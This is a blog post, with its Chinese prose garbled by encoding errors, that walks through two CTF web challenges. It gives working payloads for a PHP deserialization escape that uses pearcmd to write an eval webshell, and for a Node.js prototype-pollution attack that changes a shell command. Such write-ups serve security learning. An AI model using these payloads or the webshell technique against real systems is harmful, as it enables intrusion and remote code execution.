<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>è®°ä¸¤é“å¼ºç½‘æ‹Ÿæ€çš„web | Artone &#39;s Blog</title>

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://boooook123.github.io/Artone.github.io//favicon.ico?v=1668409090686">
<link rel="stylesheet" href="https://boooook123.github.io/Artone.github.io//styles/main.css">



<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>



    <meta name="description" content="æ²¡èƒ½æŒºè¿›å†³èµ›ï¼Œä½†æ˜¯ç¨³ç¨³è‹Ÿä½äº†å‰60ï¼Œæ‰€ä»¥é—®é¢˜ä¸å¤§ğŸ¤£

ezus
é¦–å…ˆå¯ä»¥çœ‹åˆ°è¿™ä¸€æ®µæºç 
&lt;?php
include 'tm.php'; // Next step in tm.php
if (preg_match('/tm\.php\..." />
    <meta name="keywords" content="CTF,WEB" />
  </head>
  <body>
    <div id="app" class="main">

      <div class="sidebar" :class="{ 'full-height': menuVisible }">
  <div class="top-container" data-aos="fade-right">
    <div class="top-header-container">
      <a class="site-title-container" href="https://boooook123.github.io/Artone.github.io/">
        <img src="https://boooook123.github.io/Artone.github.io//images/avatar.png?v=1668409090686" class="site-logo">
        <h1 class="site-title">Artone &#39;s Blog</h1>
      </a>
      <div class="menu-btn" @click="menuVisible = !menuVisible">
        <div class="line"></div>
      </div>
    </div>
    <div>
      
        
          <a href="/" class="site-nav">
            é¦–é¡µ
          </a>
        
      
        
          <a href="/archives" class="site-nav">
            å½’æ¡£
          </a>
        
      
        
          <a href="/tags" class="site-nav">
            æ ‡ç­¾
          </a>
        
      
        
          <a href="/post/about" class="site-nav">
            å…³äº
          </a>
        
      
    </div>
  </div>
  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
    <div class="site-description">
      ä¸€äº›ç»†ç»†çš„çäº‹ã€‚ã€‚
    </div>
    <div class="site-footer">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://boooook123.github.io/Artone.github.io//atom.xml" target="_blank">RSS</a>
    </div>
  </div>
</div>


      <div class="main-container">
        <div class="content-container" data-aos="fade-up">
          <div class="post-detail">
            <h2 class="post-title">è®°ä¸¤é“å¼ºç½‘æ‹Ÿæ€çš„web</h2>
            <div class="post-date">2022-11-08</div>
            
            <div class="post-content" v-pre>
              <p>æ²¡èƒ½æŒºè¿›å†³èµ›ï¼Œä½†æ˜¯ç¨³ç¨³è‹Ÿä½äº†å‰60ï¼Œæ‰€ä»¥é—®é¢˜ä¸å¤§ğŸ¤£</p>
<!-- more -->
<h2 id="ezus">ezus</h2>
<p>é¦–å…ˆå¯ä»¥çœ‹åˆ°è¿™ä¸€æ®µæºç </p>
<pre><code class="language-php">&lt;?php
include 'tm.php'; // Next step in tm.php
if (preg_match('/tm\.php\/*$/i', $_SERVER['PHP_SELF']))
{
    exit(&quot;no way!&quot;);
}
if (isset($_GET['source']))
{
    $path = basename($_SERVER['PHP_SELF']);
    if (!preg_match('/tm.php$/', $path) &amp;&amp; !preg_match('/index.php$/', $path))
    {
        exit(&quot;nonono!&quot;);
    }
    highlight_file($path);
    exit();
}
?&gt;
&lt;a href=&quot;index.php?source&quot;&gt;source&lt;/a&gt;
</code></pre>
<p>ç›´æ¥ç»•è¿‡å°±è¡Œ</p>
<pre><code>http://172.52.4.193/index.php/tm.php/ï¿½?source
</code></pre>
<p>å¾—åˆ°tm.phpæºç </p>
<pre><code class="language-php">&lt;?php
class UserAccount
{
    protected $username;
    protected $password;
 
    public function __construct($username, $password)
    {
        $this-&gt;username = $username;
        $this-&gt;password = $password;
    }
}
 
function object_sleep($str)
{
    $ob = str_replace(chr(0).'*'.chr(0), '@0@0@0@', $str);
    return $ob;
}
 
function object_weakup($ob)
{
    $r = str_replace('@0@0@0@', chr(0).'*'.chr(0), $ob);
    return $r;
}

class order
{
    public $f;
    public $hint;
    
    public function __construct($hint, $f)
    {
        $this-&gt;f = $f;
        $this-&gt;hint = $hint;
    }
    
    public function __wakeup()
    {
        //something in hint.php
        if ($this-&gt;hint != &quot;pass&quot; || $this-&gt;f != &quot;pass&quot;) {
            $this-&gt;hint = &quot;pass&quot;;
            $this-&gt;f = &quot;pass&quot;;
        }
    }
    
    public function __destruct()
    {
        if (filter_var($this-&gt;hint, FILTER_VALIDATE_URL))
        {
            $r = parse_url($this-&gt;hint);
            if (!empty($this-&gt;f)) {
                if (strpos($this-&gt;f, &quot;try&quot;) !==  false &amp;&amp; strpos($this-&gt;f, &quot;pass&quot;) !== false) {
                    @include($this-&gt;f . '.php');
                } else {
                    die(&quot;try again!&quot;);
                }
                if (preg_match('/prankhub$/', $r['host'])) {
                    @$out = file_get_contents($this-&gt;hint);
                    echo &quot;&lt;br/&gt;&quot;.$out;
                } else {
                    die(&quot;&lt;br/&gt;error&quot;);
                }
            } else {
                die(&quot;try it!&quot;);
            }
        }
        else
        {
            echo &quot;Invalid URL&quot;;
        }
    }
}

$username = $_POST['username'];
$password = $_POST['password'];

$user = serialize(new UserAccount($username, $password));
unserialize(object_weakup(object_sleep($user)))
?&gt; 
</code></pre>
<p>å­˜åœ¨ååºåˆ—åŒ–çš„é€ƒé€¸ï¼Œç›®çš„æ˜¯ç”¨UserAccountç±»å»è§¦å‘orderç±»ï¼Œä¹Ÿå°±æ˜¯é€ƒé€¸åŒå¼•å·ï¼Œ<br>
è®©password=new order()</p>
<p>payloadï¼š</p>
<pre><code>username=%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40&amp;password=%22%3Bs%3A11%3A%22%00*%00password%22%3BO%3A5%3A%22order%22%3A3%3A%7Bs%3A1%3A%22f%22%3Bs%3A61%3A%22php%3A%2F%2Ffilter%2Ftrypass%2Fread%3Dconvert.base64-encode%2Fresource%3Dhint%22%3Bs%3A4%3A%22hint%22%3Bs%3A25%3A%220%3A%2F%2F172.52.4.86%2F%3Bprankhub%22%3B%7D%7D
</code></pre>
<p>è¯»ä¸€ä¸‹hint.php</p>
<pre><code class="language-php">&lt;?php
echo &quot;This is the wrong way&quot;;
$flag = &quot;you can find it in /f1111444449999.txt&quot;;
?&gt;
</code></pre>
<p>å°è¯•ä¸€ä¸‹pearcmdï¼Œå‘ç°è¿˜çœŸæœ‰ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥å†™é©¬äº†</p>
<p>payloadï¼š</p>
<pre><code>POST /index.php?+config-create+/&amp;/&lt;?=eval($_POST[1])?&gt;+3.php

username=%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40&amp;password=%22%3Bs%3A11%3A%22%00*%00password%22%3BO%3A5%3A%22order%22%3A3%3A%7Bs%3A1%3A%22f%22%3Bs%3A60%3A%22trypass%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Flocal%2Flib%2Fphp%2Fpearcmd%22%3Bs%3A4%3A%22hint%22%3Bs%3A25%3A%220%3A%2F%2F172.52.4.86%2F%3Bprankhub%22%3B%7D%7D
</code></pre>
<p>getshellåè¯»flag</p>
<pre><code>(www-data:/var/www/html) $ cat /f1111444449999.txt
flag{sMGbQqN7RTQwS6L0j9f5nytW1wWBAkWJ}
</code></pre>
<h2 id="whoyouare">WHOYOUARE</h2>
<p>é¢˜ç›®é‡‡ç”¨äº†fastifyæ¡†æ¶ï¼Œä¸»è¦çš„ä»£ç åœ¨user.jsä¸­</p>
<pre><code class="language-javascript">const merge = require('../utils/merge')
const bin = &quot;/bin/bash&quot;
const ChildProcess = require('child_process');

function checkUser(command){
    if (Array.isArray(command) === false || command.length &gt; 2) {  //æ•°ç»„ä¸”é•¿åº¦å°äºç­‰äº2
        return false;
    }
    for (let i = 0; i &lt; command.length; i++) {
        let cmd = command[i];
        if (typeof cmd !== 'string' || cmd.length &gt; 4 || RegExp(/^[^a-zA-Z0-9-]+$/).test(command[i])) { //å°äºç­‰äº4çš„å­—ç¬¦ä¸²
            return false;
        }
    }
    return true;
}

async function routes (fastify, options) {
    fastify.route(
        {
            method: 'POST',
            url: '/user',
            schema: {
                querystring: {
                    user: { type: 'string' },
                },
                additionalProperties: false,
                response: {
                    200: {
                        $ref: 'respWrapper#/response/success'
                    }
                }
            },
            preHandler: function (request, reply, done) {
                //user init
                request.user = {username : 'guest', command: [&quot;-c&quot;, &quot;id&quot;]}  //æ±¡æŸ“çš„ç›®æ ‡
                let user = JSON.parse(request.body.user)  //jsoné‡Œçš„user
                // clean user command
                if (checkUser(user.command) !== true) {   //cmdéœ€è¦æ»¡è¶³æ¡ä»¶
                    user.command = [&quot;-c&quot;, &quot;id&quot;]
                }
                try {
                    merge(request.user, user)
                }catch (e){
                    reply.code(400).send({status: 1, info: &quot;Something error&quot;})
                    return ;
                }
                done()
            },
            handler : function (request, reply) {
                ChildProcess.execFile(bin, request.user.command, (error, stdout, stderr) =&gt; {   //å‘½ä»¤æ‰§è¡Œ
                    if (error) {
                        reply.code(400).send({status: 1, info: error})
                    }
                    reply.code(200).send({ status : 0 , info : `User of ${request.user.username} : ${stdout}`});
                });
            }
        })
    fastify.route({
        method: 'GET',
        url: '/',
        response: {
            $ref: 'respWrapper#/response/success'
        },
        handler: function (request, reply) {
            reply.send({ status: 0, info: 'go user' })
        }
    })
}

module.exports = routes
</code></pre>
<p>é¦–å…ˆæ˜¯ä¸¤ä¸ªè·¯ç”±ï¼ŒGETè®¿é—®åˆ™ä¼šæç¤ºæˆ‘ä»¬å»è®¿é—®user</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯POSTè®¿é—®/userï¼Œå¯ä»¥çœ‹åˆ°å®ƒä¼šæ¥å—jsonæ•°æ®ï¼Œä½†æˆ‘ä»¬å‘ç°åªæœ‰requset.userä¸­çš„cmdæ‰ä¼šè¢«æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®çš„å°±æ˜¯æƒ³åŠæ³•æ±¡æŸ“request.userå¯¹è±¡ï¼Œæˆ‘ä»¬å¯æ§çš„æ˜¯userå¯¹è±¡ï¼Œä»¥åŠé‡Œé¢çš„commandå±æ€§</p>
<p>ä¸æ­¤åŒæ—¶ï¼Œè¿™ä¸¤ä¸ªå¯¹è±¡è¿˜æœ‰ä¸€ä¸ªmergeå‡½æ•°ç›¸è¿ï¼Œè¿™å°±ä¸ºåŸå‹é“¾æ±¡æŸ“åˆ›é€ äº†æœºä¼š</p>
<pre><code>{&quot;user&quot;:{&quot;__proto__&quot;:{&quot;command&quot;:[&quot;-c&quot;, &quot;cat /flag&quot;]}}}
</code></pre>
<p><img src="https://boooook123.github.io/Artone.github.io//post-images/1667888886359.png" alt="" loading="lazy"><br>
ä½†æ˜¯éå¸¸é—æ†¾çš„æ˜¯<code>__proto___</code>è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯constructorä»¥åŠprototypeéƒ½æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œç”±äºmergeçš„é€’å½’åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨constructor.prototypeå»æŒ‡å‘userçš„åŸå‹</p>
<pre><code>{&quot;user&quot;:{&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;1&quot;,&quot;cat /flag&quot;}ï¼Œ&quot;command&quot;:[&quot;-c&quot;],}}}
</code></pre>
<p>è¿™ä¸ªjsonè¢«é€’å½’åï¼ŒObjectå¯¹è±¡ä¸­ä¼šè¢«å†™å…¥å±æ€§</p>
<pre><code>&quot;1&quot;:&quot;cat /flag&quot;
</code></pre>
<p>åœ¨åˆå¹¶commandå±æ€§æ—¶ï¼Œç”±äºuserä¸­çš„commandæ•°ç»„åªæœ‰ä¸€ä¸ªå€¼ï¼Œè€Œrequest.userä¸­çš„commandæ•°ç»„æœ‰ä¸¤ä¸ªå€¼ï¼Œæ‰€ä»¥é€’å½’è¿‡ç¨‹ä¸­ä¼šå‡ºç°(sourceæ˜¯userï¼Œtargetæ˜¯request.user)</p>
<pre><code class="language-javascript">const whileTypes = ['boolean', 'string', 'number', 'bigint', 'symbol', 'undefined'];

const merge = (target, source) =&gt; {
    for (const key in source) {
        if(!whileTypes.includes(typeof source[key]) &amp;&amp; !whileTypes.includes(typeof target[key])){
            if(key !== '__proto__'){
                merge(target[key], source[key]);
            }
        }else{
            target[key] = source[key];
        }
    }
}
</code></pre>
<p>source[1]ä¸å­˜åœ¨è€Œtarget[1]=idï¼Œäºæ˜¯ä¹å°±ä¼šè‡ªåŠ¨ä»åŸå‹ä¸­å¯»æ‰¾æ˜¯å¦æœ‰åˆé€‚çš„å€¼ï¼Œå¯¹äºæ•°ç»„æ¥è¯´ï¼Œ</p>
<p><code>&quot;1&quot;:&quot;cat /flag&quot;</code>å°±æ˜¯array[1]=&quot;cat /flag&quot;</p>
<p>äºæ˜¯sourceå°±ä»å®ƒçš„åŸå‹ä¸­ç»§æ‰¿äº†è¿™ä¸ªé”®å€¼å¯¹ï¼Œ</p>
<p>ç„¶åtarget[key] = source[key] å°±æŠŠidç¯¡æ”¹æˆäº†cat /flag</p>
<figure data-type="image" tabindex="1"><img src="https://boooook123.github.io/Artone.github.io//post-images/1667888849256.png" alt="" loading="lazy"></figure>
<p>final payloadï¼š</p>
<pre><code>{&quot;user&quot;:\&quot;constructor\&quot;:{\&quot;prototype\&quot;: {\&quot;1\&quot;: \&quot;cat /flag\&quot;,&quot;{\&quot;command\&quot;:[\&quot;-c\&quot;]}}}&quot;}
</code></pre>

            </div>
            
              <div class="tag-container">
                
                  <a href="https://boooook123.github.io/Artone.github.io/tag/gh05R7cM0/" class="tag">
                    CTF
                  </a>
                
                  <a href="https://boooook123.github.io/Artone.github.io/tag/3cJUATMNRB/" class="tag">
                    WEB
                  </a>
                
              </div>
            
            
              <div class="next-post">
                <div class="next">ä¸‹ä¸€ç¯‡</div>
                <a href="https://boooook123.github.io/Artone.github.io/post/vscodephpstudy-dong-tai-diao-shi-huan-jing/">
                  <h3 class="post-title">
                    vscode+phpstudyåŠ¨æ€è°ƒè¯•ç¯å¢ƒ
                  </h3>
                </a>
              </div>
            

            

          </div>

        </div>
      </div>
    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
<script type="application/javascript">

AOS.init();

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>






  </body>
</html>
